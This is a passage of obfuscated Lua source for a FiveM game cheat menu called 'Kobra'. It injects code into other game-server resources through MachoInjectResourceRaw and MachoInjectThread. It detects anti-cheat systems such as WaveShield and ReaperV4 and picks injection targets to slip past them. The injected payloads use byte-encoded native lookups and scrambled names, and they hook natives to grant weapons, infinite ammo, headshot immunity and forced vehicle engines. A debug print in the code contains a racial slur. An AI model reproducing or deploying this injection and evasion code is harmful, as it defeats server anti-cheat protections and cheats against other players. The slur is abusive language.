                                ]]);else local v615=0 + 0 ;while true do if (v615==(0 -0)) then print("Console Spam Stopped...");v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    _G.KobraServerConsoleSpamEnabled = false
                                ]]);break;end end end end}}}}},{icon="",label="Weapon",type="subMenu",categories={{label="Spawner",tabs={{type="button",label="Give Weapon",onSelect=function() v60("Weapon Name","WEAPON_",function(v567) if (v567 and (v567~="")) then v271:SpawnSelectedWeapon(v567);end end,"typeable");end},{type="button",label="Give All Weapons",onSelect=function() v271:GiveAllWeapons();end},{type="button",label="Remove All Weapons",onSelect=function() v271:RemoveAllWeapons();end},{type="divider",label="All Weapons"},{type="scrollable",label="Melee",scrollType="onEnter",value=1,values=v271:BuildMenuFromWeaponList({"weapon_unarmed","weapon_knife","weapon_dagger","weapon_bat","weapon_bottle","weapon_crowbar","weapon_golfclub","weapon_hammer","weapon_hatchet","weapon_machete","weapon_switchblade","weapon_nightstick","weapon_wrench"}),onSelect=function(v418) v271:SpawnSelectedWeapon(v271:GetWeaponModelFromLabel(v418));end},{type="scrollable",label="Handguns",scrollType="onEnter",value=1,values=v271:BuildMenuFromWeaponList({"weapon_pistol","weapon_pistol_mk2","weapon_combatpistol","weapon_appistol","weapon_stungun","weapon_pistol50","weapon_snspistol","weapon_heavypistol","weapon_vintagepistol","weapon_flaregun"}),onSelect=function(v419) v271:SpawnSelectedWeapon(v271:GetWeaponModelFromLabel(v419));end},{type="scrollable",label="SMGs",scrollType="onEnter",value=161 -(54 + 106) ,values=v271:BuildMenuFromWeaponList({"weapon_microsmg","weapon_smg","weapon_smg_mk2","weapon_assaultsmg","weapon_machinepistol","weapon_minismg","weapon_combatpdw"}),onSelect=function(v420) v271:SpawnSelectedWeapon(v271:GetWeaponModelFromLabel(v420));end},{type="scrollable",label="Rifles",scrollType="onEnter",value=1 + 0 ,values=v271:BuildMenuFromWeaponList({"weapon_assaultrifle","weapon_assaultrifle_mk2","weapon_carbinerifle","weapon_carbinerifle_mk2","weapon_advancedrifle","weapon_specialcarbine","weapon_bullpuprifle","weapon_gusenberg","weapon_compactrifle","weapon_bullpuprifle_mk2","weapon_marksmanrifle"}),onSelect=function(v421) v271:SpawnSelectedWeapon(v271:GetWeaponModelFromLabel(v421));end},{type="scrollable",label="Shotguns",scrollType="onEnter",value=1290 -(1140 + 149) ,values=v271:BuildMenuFromWeaponList({"weapon_pumpshotgun","weapon_pumpshotgun_mk2","weapon_sawnoffshotgun","weapon_assaultshotgun","weapon_bullpupshotgun","weapon_heavyshotgun","weapon_autoshotgun"}),onSelect=function(v422) v271:SpawnSelectedWeapon(v271:GetWeaponModelFromLabel(v422));end},{type="scrollable",label="Snipers",scrollType="onEnter",value=1 + 0 ,values=v271:BuildMenuFromWeaponList({"weapon_sniperrifle","weapon_heavysniper","weapon_heavysniper_mk2","weapon_marksmanrifle","weapon_marksmanrifle_mk2"}),onSelect=function(v423) v271:SpawnSelectedWeapon(v271:GetWeaponModelFromLabel(v423));end},{type="scrollable",label="Explosives",scrollType="onEnter",value=1,values=v271:BuildMenuFromWeaponList({"weapon_grenade","weapon_stickybomb","weapon_molotov","weapon_pipebomb","weapon_proxmine","weapon_rpg","weapon_grenadelauncher","weapon_rpg","weapon_minigun","weapon_firework"}),onSelect=function(v424) v271:SpawnSelectedWeapon(v271:GetWeaponModelFromLabel(v424));end},{type="scrollable",label="Heavy",scrollType="onEnter",value=1461 -(1295 + 165) ,values=v271:BuildMenuFromWeaponList({"weapon_mg","weapon_combatmg","weapon_gusenberg","weapon_minigun","weapon_grenadelauncher","weapon_railgun","weapon_hominglauncher","weapon_compactlauncher"}),onSelect=function(v425) v271:SpawnSelectedWeapon(v271:GetWeaponModelFromLabel(v425));end},{type="scrollable",label="Throwables",scrollType="onEnter",value=1,values=v271:BuildMenuFromWeaponList({"weapon_ball","weapon_flare","weapon_smokegrenade","weapon_bzgas","weapon_petrolcan"}),onSelect=function(v426) v271:SpawnSelectedWeapon(v271:GetWeaponModelFromLabel(v426));end}}},{label="Combat",tabs={{type="button",label="Test Button",onSelect=function() print("hi");end},{type="checkbox",label="Infinite Ammo ",desc="Infinite Ammo, this might be detected on certain servers",checked=false,onSelect=function(v427) if v427 then local v616=0 -0 ;while true do if (v616==(0 + 0)) then v271:Notify("success","Kobra","Enabled Infinite Ammo",8283 -3283 );v271:EnableInfiniteAmmo();break;end end else local v617=0 -0 ;while true do if (v617==(0 -0)) then v271:Notify("error","Kobra","Disabled Infinite Ammo",3432 + 1568 );v271:DisableInfiniteAmmo();break;end end end end},{type="checkbox",label="Anti-Headshot",checked=false,desc="This will prevent you from being headshot.",onSelect=function(v428) if v428 then v271:Notify("success","Kobra","Enabled Anti-Headshot",4514 + 486 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n) return _G[decode(n)] end

                                            -- native wrappers (obfuscated lookup style)
                                            local SetPedSuffersCriticalHits = g({83,101,116,80,101,100,83,117,102,102,101,114,115,67,114,105,116,105,99,97,108,72,105,116,115})
                                            local PlayerPedId_fn = g({80,108,97,121,101,114,80,101,100,73,100})
                                            local Wait_fn = g({87,97,105,116})

                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                -- initFlow (coroutine runner) — copy of your project's coroutine runner pattern
                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[AntiHeadshot] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.antiHeadshotEnabled and not Unloaded do
                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits(ped, false)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                local CreateThread_fn = CreateThread
                                                local Wait_fn = Wait
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetPedSuffersCriticalHits_fn = SetPedSuffersCriticalHits

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait_fn(0)
                                                        if not _G.antiHeadshotEnabled then
                                                            Wait_fn(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits_fn(ped, false)
                                                        end

                                                        ::continue::
                                                    end
                                                end)
                                            end
                                            _G.antiHeadshotEnabled = true
                                        ]]);end else local v618=0;while true do if (v618==0) then v271:Notify("error","Kobra","Disabled Anti-Headshot",4766 + 234 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            -- simply clear the flag; coroutine loop will stop
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false
                                        ]]);else v48("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false

                                            -- try to restore default behavior once (best-effort)
                                            if PlayerPedId and SetPedSuffersCriticalHits then
                                                local ped = PlayerPedId()
                                                if ped and ped ~= 0 then
                                                    pcall(function() SetPedSuffersCriticalHits(ped, true) end)
                                                end
                                            end
                                        ]]);end break;end end end end}}}}},{icon="",label="Vehicle",type="subMenu",categories={{label="Spawner",tabs={{type="checkbox",label="Teleport Into",desc="If selected, this will teleport you into the selected vehicle.",checked=false,onSelect=function(v429) v43=v429 or false ;end},{type="checkbox",label="Delete Previous",desc="If selected, this will delete your previous vehicle when spawning selected vehicle.",checked=false,onSelect=function(v430) v42=v430 or false ;end},{type="divider",label="All Vehicles"},{type="button",label="Addon",onSelect=function() v60("Addon Vehicle","",function(v568) if (v568 and (v568~="")) then v271:SpawnSelectedVehicle(v568,v43,v42);end end,"typeable");end},{icon="ph ph-car",label="Compacts",type="scrollable",scrollType="onEnter",value=1,values={"asbo","blista","brioso","brioso2","brioso3","club","dilettante","dilettante2","issi2","issi3","issi4","issi5","issi6","kanjo","panto","prairie","rhapsody","weevil"},onSelect=function(v431) v271:SpawnSelectedVehicle(v431,v43,v42);end},{icon="ph ph-car",label="Sedans",type="scrollable",scrollType="onEnter",value=1,values={"asea","asea2","asterope","asterope2","cinquemila","driftchavosv6","cog55","cog552","cognoscenti","cognoscenti2","deity","hardy","drifthardy","emperor","emperor2","emperor3","fugitive","glendale","glendale2","impaler5","ingot","intruder","minimus","limo2","premier","primo","primo2","regina","rhinehart","romero","schafter2","schafter5","schafter6","stafford","stanier","stratum","stretch","superd","surge","tailgater","tailgater2","warrener","warrener2","washington"},onSelect=function(v432) v271:SpawnSelectedVehicle(v432,v43,v42);end},{icon="ph ph-car",label="SUVs",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"aleutian","astron","baller","baller2","baller3","baller4","baller5","baller6","baller7","baller8","bjxl","cavalcade","cavalcade2","cavalcade3","contender","dorado","dubsta","dubsta2","everon3","fq2","granger","granger2","gresley","habanero","huntley","issi8","iwagen","jubilee","landstalker","landstalker2","mesa","mesa2","novak","patriot","patriot2","radi","rebla","rocoto","seminole","seminole2","serrano","squaddie","toros","vivanite","woodlander","xls","xls2"},onSelect=function(v433) v271:SpawnSelectedVehicle(v433,v43,v42);end},{icon="ph ph-car",label="Coupes",type="scrollable",scrollType="onEnter",value=1,values={"cogcabrio","driftfr36","exemplar","f620","felon","felon2","fr36","jackal","kanjosj","oracle","oracle2","postlude","previon","sentinel","sentinel2","windsor","windsor2","zion","zion2"},onSelect=function(v434) v271:SpawnSelectedVehicle(v434,v43,v42);end},{icon="ph ph-car",label="Muscles",type="scrollable",scrollType="onEnter",value=1,values={"blade","brigham","broadway","buccaneer","buccaneer2","buffalo4","buffalo5","chino","chino2","clique","clique2","coquette3","deviant","dominator","dominator2","dominator3","dominator4","dominator5","dominator6","dominator7","dominator8","dominator9","driftdominator10","driftyosemite","dukes","dukes2","dukes3","ellie","eudora","faction","faction2","faction3","gauntlet","gauntlet2","gauntlet3","gauntlet4","gauntlet5","driftgauntlet4","greenwood","hermes","hotknife","hustler","impaler","impaler2","impaler3","impaler4","impaler6","imperator","imperator2","imperator3","lurcher","manana2","moonbeam","moonbeam2","nightshade","peyote2","phoenix","picador","ratloader","ratloader2","ruiner","ruiner2","ruiner3","ruiner4","sabregt","sabregt2","slamvan","slamvan2","slamvan3","slamvan4","slamvan5","slamvan6","stalion","stalion2","tahoma","tampa","tampa3","tampa4","tulip","tulip2","vamos","vigero","vigero2","vigero3","virgo","virgo2","virgo3","voodoo","voodoo2","weevil2","yosemite","yosemite2"},onSelect=function(v435) v271:SpawnSelectedVehicle(v435,v43,v42);end},{icon="ph ph-car",label="Sports Classic",type="scrollable",scrollType="onEnter",value=2 -1 ,values={"ardent","btype","btype2","btype3","casco","cheburek","cheetah2","cheetah3","coquette2","deluxo","dynasty","fagaloa","feltzer3","gt500","infernus2","jb700","jb7002","mamba","manana","michelli","monroe","nebula","peyote","peyote3","pigalle","rapidgt3","retinue","retinue2","savestra","stinger","stingergt","stromberg","swinger","toreador","torero","tornado","tornado2","tornado3","tornado4","tornado5","tornado6","turismo2","viseris","z190","zion3","ztype"},onSelect=function(v436) v271:SpawnSelectedVehicle(v436,v43,v42);end},{icon="ph ph-car",label="Sports",type="scrollable",value=1 + 0 ,values={"alpha","banshee","bestiagts","blista2","blista3","buffalo","buffalo2","buffalo3","calico","carbonizzare","comet2","comet3","comet4","comet5","comet6","comet7","coquette","coquette4","corsita","coureur","cypher","drafter","drifteuros","driftfuto","driftjester","driftremus","drifttampa","driftzr350","elegy","elegy2","euros","everon2","feltzer2","flashgt","furoregt","fusilade","futo","futo2","gauntlet6","gb200","growler","hotring","imorgon","issi7","italigto","italirsx","jester","jester2","jester3","jester4","jugular","khamelion","komoda","kuruma","kuruma2","locust","lynx","massacro","massacro2","neo","neon","ninef","ninef2","omnis","omnisegt","panthere","paragon","paragon2","pariah","penumbra","penumbra2","r300","raiden","rapidgt","rapidgt2","rapidgt4","raptor","remus","revolter","rt3000","ruston","schafter3","schafter4","schlagen","schwarzer","sentinel3","sentinel4","sentinel5","seven70","sm722","specter","specter2","stingertt","streiter","sugoi","sultan","sultan2","sultan3","surano","tampa2","tenf","tenf2","tropos","vectre","verlierer2","veto","veto2","vstr","zr350","zr380","zr3802","zr3803"},onSelect=function(v437) v271:SpawnSelectedVehicle(v437,v43,v42);end},{icon="ph ph-car",label="Super",type="scrollable",scrollType="onEnter",value=258 -(212 + 45) ,values={"adder","autarch","banshee2","bullet","champion","cheetah","cyclone","deveste","emerus","entity2","entity3","entityxf","fmj","furia","gp1","ignus","infernus","italigtb","italigtb2","krieger","le7b","lm87","nero","nero2","osiris","penetrator","pfister811","prototipo","reaper","s80","sc1","scramjet","sheava","sultanrs","suzume","t20","taipan","tempesta","tezeract","thrax","tigon","torero2","turismo3","turismor","tyrant","tyrus","vacca","vagner","vigilante","virtue","visione","voltic","voltic2","xa21","zeno","zentorno","zorrusso"},onSelect=function(v438) v271:SpawnSelectedVehicle(v438,v43,v42);end},{icon="ph ph-car",label="Motorcycles",type="scrollable",scrollType="onEnter",value=1,values={"akuma","avarus","bagger","bati","bati2","bf400","carbonrs","chimera","cliffhanger","daemon","daemon2","deathbike","deathbike2","deathbike3","defiler","diablous","diablous2","double","enduro","esskey","faggio","faggio2","faggio3","fcr","fcr2","gargoyle","hakuchou","hakuchou2","hexer","innovation","lectro","manchez","manchez2","manchez3","nemesis","nightblade","oppressor","oppressor2","pcj","powersurge","ratbike","reever","rrocket","ruffian","sanchez","sanchez2","sanctus","shinobi","shotaro","sovereign","stryder","thrust","vader","vindicator","vortex","wolfsbane","zombiea","zombieb"},onSelect=function(v439) v271:SpawnSelectedVehicle(v439,v43,v42);end},{icon="ph ph-car",label="Off-Road",type="scrollable",scrollType="onEnter",value=1,values={"bfinjection","bifta","blazer","blazer2","blazer3","blazer4","blazer5","bodhi2","boor","brawler","bruiser","bruiser2","bruiser3","brutus","brutus2","brutus3","caracara","caracara2","dloader","draugur","driftl352","dubsta3","dune","dune2","dune3","dune4","dune5","freecrawler","hellion","insurgent","insurgent2","insurgent3","kalahari","kamacho","l35","l352","marshall","menacer","mesa3","monster","monster3","monster4","monster5","monstrociti","nightshark","outlaw","patriot3","rancherxl","rancherxl2","ratel","rcbandito","rebel","rebel2","riata","sandking","sandking2","technical","technical2","technical3","terminus","trophytruck","trophytruck2","vagrant","verus","winky","yosemite3","zhaba"},onSelect=function(v440) v271:SpawnSelectedVehicle(v440,v43,v42);end},{icon="ph ph-car",label="Industrial",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"bulldozer","cutter","dump","flatbed","flatbed2","guardian","handler","mixer","mixer2","rubble","tiptruck","tiptruck2"},onSelect=function(v441) v271:SpawnSelectedVehicle(v441,v43,v42);end},{icon="ph ph-car",label="Utility",type="scrollable",scrollType="onEnter",value=506 -(223 + 282) ,values={"airtug","armytanker","armytrailer","armytrailer2","baletrailer","boattrailer","boattrailer2","boattrailer3","caddy","caddy2","caddy3","docktrailer","docktug","forklift","freighttrailer","graintrailer","mower","proptrailer","raketrailer","ripley","sadler","sadler2","scrap","slamtruck","tanker","tanker2","towtruck","towtruck2","towtruck3","towtruck4","tr2","tr3","tr4","tractor","tractor2","tractor3","trailerlarge","trailerlogs","trailers","trailers2","trailers3","trailers4","trailers5","trailersmall","trflat","tvtrailer","tvtrailer2","utillitruck","utillitruck2","utillitruck3"},onSelect=function(v442) v271:SpawnSelectedVehicle(v442,v43,v42);end},{icon="ph ph-car",label="Vans",type="scrollable",scrollType="onEnter",value=2 -1 ,values={"bison","bison2","bison3","bobcatxl","boxville","boxville2","boxville3","boxville4","boxville5","boxville6","burrito","burrito2","burrito3","burrito4","burrito5","camper","gburrito","gburrito2","journey","journey2","minivan","minivan2","paradise","pony","pony2","rumpo","rumpo2","rumpo3","speedo","speedo2","speedo4","speedo5","surfer","surfer2","surfer3","taco","youga","youga2","youga3","youga4"},onSelect=function(v443) v271:SpawnSelectedVehicle(v443,v43,v42);end}}},{label="Vehicle Customization",tabs={{type="button",label="Set License Plate",onSelect=function() v60("Set License Plate","",function(v569) if (v569 and (v569~="")) then local v729=0 -0 ;local v730;while true do if (v729==(0 + 0)) then v730=string.format([[
                                            local function xKqLZVwPt9()
                                                local XcVbNmAsDfGhJkL = PlayerPedId
                                                local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                                                local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                                                local pEd = XcVbNmAsDfGhJkL()
                                                local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                                                if vEh and vEh ~= 0 then
                                                    PoIuYtReWqAzXsDc(vEh, "%s")
                                                end
                                            end

                                            xKqLZVwPt9()
                                        ]],v569);MachoInjectResourceRaw("any",v730);break;end end else v12:Notify("Invalid input","Please enter a valid license plate.","error");end end,"typeable");end},{type="button",label="Repair Vehicle",onSelect=function() v271:RepairVehicle();end},{type="button",label="Clean Vehicle",onSelect=function() local v444=0;while true do if (v444==(0 -0)) then v12:Notify("success","Kobra","Cleaned Vehicle",3423 -(18 + 405) );MachoInjectResourceRaw("any",[[
                            local function qPwRYKz7mL()
                                local a = PlayerPedId
                                local b = GetVehiclePedIsIn
                                local c = SetVehicleDirtLevel

                                local ped = a()
                                local veh = b(ped, false)
                                if veh and veh ~= 0 then
                                    c(veh, 0.0)
                                end
                            end

                            qPwRYKz7mL()
                            ]]);break;end end end},{type="button",label="Force Vehicle Engine",onSelect=function() v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return false end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return false end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                                GhYtReFdCxWaQzLp = true

                                local function OpAsDfGhJkLzXcVb()
                                    local lMnbVcXzZaSdFg = CreateThread
                                    lMnbVcXzZaSdFg(function()
                                        local QwErTyUiOp         = _G.PlayerPedId
                                        local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                                        local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                                        local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                                        local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                                        local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                                        local En_g_Health_Get    = _G.GetVehicleEngineHealth
                                        local En_g_Health_Set    = _G.SetVehicleEngineHealth
                                        local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                                        local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                                        local function _tick(vh)
                                            if vh and vh ~= 0 then
                                                No_Hotwire_Set(vh, false)
                                                En_g_Degrade_Set(vh, false)
                                                ErTyUiOpAsDfGh(vh, false)
                                                KeEpOnAb(vh, true)

                                                local eh = En_g_Health_Get(vh)
                                                if (not eh) or eh < 300.0 then
                                                    En_g_Health_Set(vh, 900.0)
                                                end

                                                ZxCvBnMqWeRtYu(vh, true, true, true)
                                            end
                                        end

                                        while GhYtReFdCxWaQzLp and not Unloaded do
                                            local p  = QwErTyUiOp()

                                            _tick(AsDfGhJkLz(p, false))
                                            _tick(TyUiOpAsDfGh(p))
                                            _tick(AsDfGhJkLz(p, true))

                                            Wait(0)
                                        end
                                    end)
                                end

                                OpAsDfGhJkLzXcVb()
                            ]]);end,function() v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                GhYtReFdCxWaQzLp = false
                                local v = GetVehiclePedIsIn(PlayerPedId(), false)
                                if v and v ~= 0 then
                                    SetVehicleKeepEngineOnWhenAbandoned(v, false)
                                    SetVehicleEngineCanDegrade(v, true)
                                    SetVehicleUndriveable(v, false)
                                end
                            ]]);end},{type="button",label="Max Upgrade",onSelect=function() v12:Notify("success","Kobra","Vehicle Max Upgraded",3000);local v445=GetResourceState("WaveShield")=="started" ;local v446=GetResourceState("ReaperV4")=="started" ;if v445 then local v619=0 -0 ;while true do if (v619==(978 -(194 + 784))) then print("WaveNiggaStarted");MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);break;end end elseif v446 then local v792=1770 -(694 + 1076) ;while true do if (v792==(1904 -(122 + 1782))) then print("using Reaper fallback");MachoInjectThread(0,"any","",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);break;end end else MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
